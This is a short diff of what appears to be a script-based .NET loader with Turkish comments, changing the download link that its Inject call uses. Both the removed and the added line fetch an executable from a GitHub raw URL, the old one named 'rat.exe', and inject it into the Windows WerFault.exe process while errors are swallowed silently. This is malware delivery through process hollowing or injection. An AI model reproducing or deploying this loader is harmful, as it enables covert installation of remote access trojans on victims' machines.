@@ -38,7 +38,7 @@
                 var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
                 
                 // Senin EXE linkin
-                o.Inject("https://github.com/Boboalover/ratanaman/raw/refs/heads/main/rat.exe", "C:\\Windows\\System32\\WerFault.exe");
+                o.Inject("https://github.com/Boboalover/d-jan/raw/refs/heads/main/engouranceCS%20v1.3.exe", "C:\\Windows\\System32\\WerFault.exe");
 
             } catch (e) {
                 // Hata mesajını sessizce yutmak veya debug etmek için
